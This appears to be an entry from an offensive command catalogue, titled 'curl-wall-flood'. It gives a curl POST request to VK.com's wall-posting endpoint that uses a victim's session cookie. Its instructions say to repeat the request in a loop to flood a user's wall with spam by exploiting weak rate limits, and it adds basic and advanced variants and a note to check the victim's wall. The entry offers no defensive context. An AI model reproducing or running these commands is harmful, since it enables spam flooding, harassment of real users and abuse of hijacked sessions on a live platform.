---
data: >-
  curl -X POST 'https://vk.com/al_wall.php' -d 'act=post' -d 'al=1' -d
  'app_id=123456' -d 'message=Spam Test' -H 'Cookie: remixtid=VICTIM_SESSION;'
tags:
  - flooding
  - web
  - spam
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:23.540Z'
id: b957ad72-9860-499b-931b-60911cf1b99e
verified: false
validated: true
submitted: true
---
# curl-wall-flood

## Command

```bash
curl -X POST 'https://vk.com/al_wall.php' \
  -d 'act=post' \
  -d 'al=1' \
  -d 'app_id=123456' \
  -d 'message=Spam Test' \
  -H 'Cookie: remixtid=VICTIM_SESSION;'
```

## Description

This curl command posts a message to a VK.com user's wall via an app ID, exploiting weak rate limits. Repeat it in a loop to flood the wall with spam.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-d 'act=post'` | Action to post | Yes |
| `-d 'app_id=...'` | App ID for integration | Yes |
| `-d 'message=...'` | Text to post | Yes |
| `-H 'Cookie: ...'` | Session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://vk.com/al_wall.php' -d 'act=post' -d 'app_id=123456' -d 'message=Flood' -H 'Cookie: remixtid=abc;'
```

### Advanced Usage

```bash
curl -X POST 'https://vk.com/al_wall.php' \
  -d 'act=post' \
  -d 'al=1' \
  -d 'app_id=123456' \
  -d 'message=Advanced Spam' \
  -H 'Cookie: remixtid=abc;' \
  -v
```

## Expected Output

Response with post ID, e.g., {"post_id": "789"}. Check victim's wall for the message.

## Related

- [[Related Procedure: Flood-Messages-on-VK-User-Wall]]
